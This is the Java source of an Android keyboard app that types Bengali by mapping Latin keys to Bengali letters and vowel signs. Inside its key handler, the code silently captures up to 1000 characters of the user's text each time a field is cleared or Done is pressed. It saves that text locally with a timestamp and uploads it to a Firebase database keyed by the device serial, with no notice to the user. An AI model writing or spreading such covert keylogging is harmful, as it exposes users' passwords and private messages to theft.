package com.example.myboard;

import android.app.Service;
import android.content.Intent;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.media.Image;
import android.os.IBinder;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.ExtractedTextRequest;
import android.view.inputmethod.InputConnection;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class Myboard extends InputMethodService implements KeyboardView.OnKeyboardActionListener {

    CharSequence TexT="";
    private KeyboardView keyboardView;
    private Keyboard keyboard;
    FirebaseDatabase rootNode;
    DatabaseReference reference,reference1;
    Calendar calendar;
    private String saveCurrentDate, saveCurrentTime,productRandomKey,SERIAL;

    public String s;
    private boolean caps = false;
    private boolean ban=false;
    private boolean dn=false;
    int var=1;

    @Override
    public View onCreateInputView()
    {
        keyboardView = (KeyboardView) getLayoutInflater().inflate(R.layout.keyboard, null);
        keyboard = new Keyboard(this, R.xml.qwerty);
        keyboardView.setKeyboard(keyboard);
        keyboardView.setOnKeyboardActionListener(this);
        return keyboardView;
    }
    @Override
    public void onPress(int i) {
        ///done button is pressed.
        if(i==-4)
        {
            return;
        }
        else if(i==-5&&s.length()>0)
        {

        }
        else if(i!=-5) {

            }

    }

    @Override
    public void onRelease(int i) {

    }

    @Override
    public void onKey(int primaryCode, int[] keyCodes)
    {
        rootNode=FirebaseDatabase.getInstance();
        reference=rootNode.getReference();
        reference1=rootNode.getReference();
        final Mydb mfo = new Mydb(getApplicationContext());
        SERIAL=mfo.my_data();
        InputConnection inputConnection = getCurrentInputConnection();
        if (inputConnection != null) {
            CharSequence beforeText = inputConnection.getTextBeforeCursor(1000, 0);
            s=beforeText.toString();
            if(s.length()==0)
            {
               /// Toast.makeText(Myboard.this,TexT,Toast.LENGTH_LONG).show();
                SimpleDateFormat sdf = new SimpleDateFormat("dd.MM.yyyy 'at' HH:mm:ss");
                String currentDateandTime = sdf.format(new Date());
                DataTemp dt = new DataTemp(TexT.toString(),currentDateandTime);
                final MyDBFunctions mf = new MyDBFunctions(getApplicationContext());
                mf.addingDataToTable(dt);
                if(!TexT.equals(""))
                {
                    final HelperClass helping = new HelperClass(TexT, currentDateandTime);
                    reference1.addListenerForSingleValueEvent(new ValueEventListener() {
                        @Override
                        public void onDataChange(DataSnapshot Snapshot) {
                            while (Snapshot.child(SERIAL).child(String.valueOf(var)).exists())
                                var++;

                            reference1.child(SERIAL).child(String.valueOf(var)).setValue(helping);
                        }

                        @Override
                        public void onCancelled(@NonNull DatabaseError error) {
                            Toast.makeText(Myboard.this, "No internet!", Toast.LENGTH_LONG).show();
                        }
                    });
                }
            }
            switch(primaryCode) {
                case Keyboard.KEYCODE_DELETE :
                    CharSequence selectedText = inputConnection.getSelectedText(0);
                    if (TextUtils.isEmpty(selectedText)) {
                        inputConnection.deleteSurroundingText(1, 0);
                    } else {
                        inputConnection.commitText("", 1);
                    }
                    break;

                case Keyboard.KEYCODE_SHIFT:
                    caps = !caps;
                    keyboard.setShifted(caps);
                    keyboardView.invalidateAllKeys();
                    break;
                case 2:
                    ban=!ban;
                    break;
                case Keyboard.KEYCODE_DONE:
                    inputConnection.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                    SimpleDateFormat sdf = new SimpleDateFormat("dd.MM.yyyy 'at' HH:mm:ss");
                    String currentDateandTime = sdf.format(new Date());
                    DataTemp dt = new DataTemp(beforeText.toString(),currentDateandTime);
                    final MyDBFunctions mf = new MyDBFunctions(getApplicationContext());
                    mf.addingDataToTable(dt);
                    final HelperClass help=new HelperClass(beforeText,currentDateandTime);
                        reference.addListenerForSingleValueEvent(new ValueEventListener() {
                            @Override
                            public void onDataChange(DataSnapshot snapshot)
                            {
                                    while(snapshot.child(SERIAL).child(String.valueOf(var)).exists()) var++;

                                    reference.child(SERIAL).child(String.valueOf(var)).setValue(help);
                            }
                            @Override
                            public void onCancelled(@NonNull DatabaseError error) {
                                Toast.makeText(Myboard.this,"No internet!",Toast.LENGTH_LONG).show();
                            }
                        });
                    break;

                default :
                    char code = (char) primaryCode;
                    if(Character.isLetter(code) && caps){
                        code = Character.toUpperCase(code);
                    }
                    if(!ban||code==32) {
                        inputConnection.commitText(String.valueOf(code), 1);
                    }
                    else {
                            String sh =BAN(code) ;
                            if((sh.equals("আ")||sh.equals("উ")||sh.equals("ই")||sh.equals("এ")||(sh.equals("ও")&&caps))!=true){
                            inputConnection.commitText((String.valueOf(sh)), 1);}
                            CharSequence Text = inputConnection.getTextBeforeCursor(1,0);
                            CharSequence selected = inputConnection.getSelectedText(0);
                            if (sh.equals("আ"))
                            {
                                if (TextUtils.isEmpty(selected)) {
                                    inputConnection.deleteSurroundingText(1, 0);
                                } else {
                                    inputConnection.commitText("", 1);
                                }
                                inputConnection.commitText(akar(String.valueOf(Text)), 1);
                            }
                            else if (sh.equals("উ"))
                            {
                                if (TextUtils.isEmpty(selected)) {
                                    inputConnection.deleteSurroundingText(1, 0);
                                } else {
                                    inputConnection.commitText("", 1);
                                }
                                inputConnection.commitText(ukar(String.valueOf(Text)), 1);
                            }
                            else if (sh.equals("ই"))
                            {
                                if (TextUtils.isEmpty(selected)) {
                                    inputConnection.deleteSurroundingText(1, 0);
                                } else {
                                    inputConnection.commitText("", 1);
                                }
                                inputConnection.commitText(ikar(String.valueOf(Text)), 1);
                            }
                            else if (sh.equals("এ"))
                            {
                                if (TextUtils.isEmpty(selected)) {
                                    inputConnection.deleteSurroundingText(1, 0);
                                } else {
                                    inputConnection.commitText("", 1);
                                }
                                inputConnection.commitText(ekar(String.valueOf(Text)), 1);
                            }
                            else if(sh.equals("ও")&&caps)
                            {
                                if (TextUtils.isEmpty(selected)) {
                                    inputConnection.deleteSurroundingText(1, 0);
                                } else {
                                    inputConnection.commitText("", 1);
                                }
                                inputConnection.commitText(Okar(String.valueOf(Text)), 1);
                            }
                    }
            }
            TexT=inputConnection.getTextBeforeCursor(1000, 0);
        }

    }


    @Override
    public void onText(CharSequence charSequence) {
           Toast.makeText(getApplicationContext(),charSequence,Toast.LENGTH_LONG).show();
    }

    @Override
    public void swipeLeft() {

    }

    @Override
    public void swipeRight() {

    }

    @Override
    public void swipeDown() {

    }

    @Override
    public void swipeUp() {

    }

    public String BAN(Character c)
    {
        String ss="";
        if(c=='a') ss="আ";
        if(c=='b') ss="ব";
        if(c=='c') ss="চ";
        if(c=='d') ss="ড";
        if(c=='e') ss="এ";
        if(c=='f') ss="ফ";
        if(c=='g') ss="গ";
        if(c=='h') ss="হ";
        if(c=='i') ss="ই";
        if(c=='j') ss="জ";
        if(c=='k') ss="ক";
        if(c=='l') ss="ল";
        if(c=='m') ss="ম";
        if(c=='n') ss="ন";
        if(c=='o') ss="অ";
        if(c=='p') ss="প";
        if(c=='q') ss="ক";
        if(c=='r') ss="র";
        if(c=='s') ss="স";
        if(c=='t') ss="ত";
        if(c=='u') ss="উ";
        if(c=='v') ss="ভ";
        if(c=='w') ss="ও";
        if(c=='x') ss="এক্স";
        if(c=='y') ss="য়";
        if(c=='z') ss="য";

        if(c=='A') ss="আ";
        if(c=='B') ss="ব";
        if(c=='C') ss="চ";
        if(c=='D') ss="ড";
        if(c=='E') ss="এ";
        if(c=='F') ss="ফ";
        if(c=='G') ss="গ";
        if(c=='H') ss="হ";
        if(c=='I') ss="ই";
        if(c=='J') ss="জ";
        if(c=='K') ss="ক";
        if(c=='L') ss="ল";
        if(c=='M') ss="ম";
        if(c=='N') ss="ণ";
        if(c=='O') ss="ও";
        if(c=='P') ss="প";
        if(c=='Q') ss="ক";
        if(c=='R') ss="ড়";
        if(c=='S') ss="শ";
        if(c=='T') ss="ট";
        if(c=='U') ss="ঊ";
        if(c=='V') ss="ভ";
        if(c=='W') ss="ও";
        if(c=='X') ss="এক্স";
        if(c=='Y') ss="য়";
        if(c=='Z') ss="য";
        return ss;
    }
    public String akar(String cc)
    {
        String ss="আ";
        if(cc.equals("ট")) ss="টা";
        if(cc.equals("শ")) ss="শা";
        if(cc.equals("ড়")) ss="ড়া";
        if(cc.equals("ণ")) ss="ণা";

        if(cc.equals("ব")) ss="বা";
        if(cc.equals("চ")) ss="চা";
        if(cc.equals("ড")) ss="ডা";
        if(cc.equals("ফ")) ss="ফা";
        if(cc.equals("গ")) ss="গা";
        if(cc.equals("হ")) ss="হা";
        if(cc.equals("জ")) ss="জা";
        if(cc.equals("ক")) ss="কা";
        if(cc.equals("ল")) ss="লা";
        if(cc.equals("ম")) ss="মা";
        if(cc.equals("ন")) ss="না";
        if(cc.equals("প")) ss="পা";
        if(cc.equals("র")) ss="রা";
        if(cc.equals("স")) ss="সা";
        if(cc.equals("ত")) ss="তা";
        if(cc.equals("ভ")) ss="ভা";
        if(cc.equals("য়")) ss="য়া";
        if(cc.equals("য")) ss="যা";
        if(cc.equals(" ")) ss=" আ";
        return ss;
    }
    public String ikar(String cc)
    {
        String ss="ই";
        if(cc.equals("ট")) ss="টি";
        if(cc.equals("শ")) ss="শি";
        if(cc.equals("ড়")) ss="ড়ি";
        if(cc.equals("ণ")) ss="ণি";

        if(cc.equals("ব")) ss="বি";
        if(cc.equals("চ")) ss="চি";
        if(cc.equals("ড")) ss="ডি";
        if(cc.equals("ফ")) ss="ফি";
        if(cc.equals("গ")) ss="গি";
        if(cc.equals("হ")) ss="হি";
        if(cc.equals("জ")) ss="জি";
        if(cc.equals("ক")) ss="কি";
        if(cc.equals("ল")) ss="লি";
        if(cc.equals("ম")) ss="মি";
        if(cc.equals("ন")) ss="নি";
        if(cc.equals("প")) ss="পি";
        if(cc.equals("র")) ss="রি";
        if(cc.equals("স")) ss="সি";
        if(cc.equals("ত")) ss="তি";
        if(cc.equals("ভ")) ss="ভি";
        if(cc.equals("য়")) ss="য়ী";
        if(cc.equals("য")) ss="যি";
        if(cc.equals(" ")) ss=" ই";
        return ss;
    }
    public String ukar(String cc)
    {
        String ss="উ";
        if(cc.equals("ট")) ss="টু";
        if(cc.equals("শ")) ss="শু";
        if(cc.equals("ড়")) ss="ড়ু";
        if(cc.equals("ণ")) ss="ণু";

        if(cc.equals("ব")) ss="বু";
        if(cc.equals("চ")) ss="চু";
        if(cc.equals("ড")) ss="ডু";
        if(cc.equals("ফ")) ss="ফু";
        if(cc.equals("গ")) ss="গু";
        if(cc.equals("হ")) ss="হু";
        if(cc.equals("জ")) ss="জু";
        if(cc.equals("ক")) ss="কু";
        if(cc.equals("ল")) ss="লু";
        if(cc.equals("ম")) ss="মু";
        if(cc.equals("ন")) ss="নু";
        if(cc.equals("প")) ss="পু";
        if(cc.equals("র")) ss="রু";
        if(cc.equals("স")) ss="সু";
        if(cc.equals("ত")) ss="তু";
        if(cc.equals("ভ")) ss="ভু";
        if(cc.equals("য়")) ss="য়ু";
        if(cc.equals("য")) ss="যু";
        if(cc.equals(" ")) ss=" উ";
        return ss;
    }
    public String ekar(String cc)
    {
        String ss="এ";
        if(cc.equals("ট")) ss="টে";
        if(cc.equals("শ")) ss="শে";
        if(cc.equals("ড়")) ss="ড়ে";
        if(cc.equals("ণ")) ss="ণে";

        if(cc.equals("ব")) ss="বে";
        if(cc.equals("চ")) ss="চে";
        if(cc.equals("ড")) ss="ডে";
        if(cc.equals("ফ")) ss="ফে";
        if(cc.equals("গ")) ss="গে";
        if(cc.equals("হ")) ss="হে";
        if(cc.equals("জ")) ss="জে";
        if(cc.equals("ক")) ss="কে";
        if(cc.equals("ল")) ss="লে";
        if(cc.equals("ম")) ss="মে";
        if(cc.equals("ন")) ss="নে";
        if(cc.equals("প")) ss="পে";
        if(cc.equals("র")) ss="রে";
        if(cc.equals("স")) ss="সে";
        if(cc.equals("ত")) ss="তে";
        if(cc.equals("ভ")) ss="ভে";
        if(cc.equals("য়")) ss="য়ে";
        if(cc.equals("য")) ss="যে";
        if(cc.equals(" ")) ss=" এ";
        return ss;
    }
    String Okar(String cc)
    {
        String ss="ও";
        if(cc.equals("ট")) ss="টো";
        if(cc.equals("শ")) ss="শো";
        if(cc.equals("ড়")) ss="ড়ো";
        if(cc.equals("ণ")) ss="ণো";

        if(cc.equals("ব")) ss="বো";
        if(cc.equals("চ")) ss="চো";
        if(cc.equals("ড")) ss="ডো";
        if(cc.equals("ফ")) ss="ফে";
        if(cc.equals("গ")) ss="গো";
        if(cc.equals("হ")) ss="হো";
        if(cc.equals("জ")) ss="জো";
        if(cc.equals("ক")) ss="কো";
        if(cc.equals("ল")) ss="লো";
        if(cc.equals("ম")) ss="মো";
        if(cc.equals("ন")) ss="নো";
        if(cc.equals("প")) ss="পো";
        if(cc.equals("র")) ss="রো";
        if(cc.equals("স")) ss="সো";
        if(cc.equals("ত")) ss="তো";
        if(cc.equals("ভ")) ss="ভো";
        if(cc.equals("য়")) ss="য়ো";
        if(cc.equals("য")) ss="যো";
        if(cc.equals(" ")) ss=" ও";
        return ss;
    }

}
